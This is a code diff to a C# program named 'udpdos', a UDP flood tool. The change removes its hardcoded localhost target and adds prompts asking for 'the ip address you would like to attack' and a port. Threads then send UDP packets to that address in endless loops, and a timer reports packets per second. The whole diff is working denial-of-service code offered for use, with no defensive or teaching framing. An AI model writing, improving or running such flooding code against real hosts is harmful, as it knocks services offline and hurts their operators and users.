@@ -5,19 +5,21 @@ using System.Text;
 using System.Timers;
 
 
-//Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
-
-//IPAddress broadcast = IPAddress.Parse("127.0.0.1");
 public class udpdos
 {
     public static int count = 0;
-    public static byte[] sendbuf = Encoding.ASCII.GetBytes(" ");
-    public static string ipaddr = "127.0.0.1";
+    public static byte[] sendbuf = Encoding.ASCII.GetBytes("hello");
+    public static string ipaddr;
     public static Random rnd = new Random();
-    public static UdpClient udpClient = new UdpClient(new IPEndPoint(IPAddress.Any, 0));
-
+    public static int port;
     public static void Main(string[] args)
     {
+        Console.WriteLine("Enter in the ip address you would like to attack. ");
+        ipaddr = Console.ReadLine();
+
+        Console.WriteLine("Enter in the port:");
+        port = int.Parse(Console.ReadLine());
+
         startThreads();
         Thread temp = new Thread(new ThreadStart(timer));
         temp.Start();
@@ -25,26 +27,35 @@ public class udpdos
     }
     public static void scream()
     {
-        try
+        UdpClient udpClient = new UdpClient();
+        while (true)
         {
-            while (true)
+            try
             {
-                int port = rnd.Next(1000, 65535);
-                udpClient.Send(sendbuf, sendbuf.Length, ipaddr, port);
-                count++;
+                while (true)
+                {
+                    //port = rnd.Next(1000, 65535);
+                    udpClient.Send(sendbuf, sendbuf.Length, ipaddr, port);
+                    count++;
+                }
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.ToString());
             }
         }
-        catch (Exception e)
-        {
-            Thread.Sleep(100);
-            Console.WriteLine(e.ToString());
-        }
+        
 
     }
     public static void timer()
     {
-        Thread.Sleep(5000);
-        Console.WriteLine(count);
+        while (true)
+        {
+            Thread.Sleep(2000);
+            Console.WriteLine($"Speed: {count/2} packets per second");
+            count = 0; 
+        }
+        
     }
     public static void startThreads()
     {
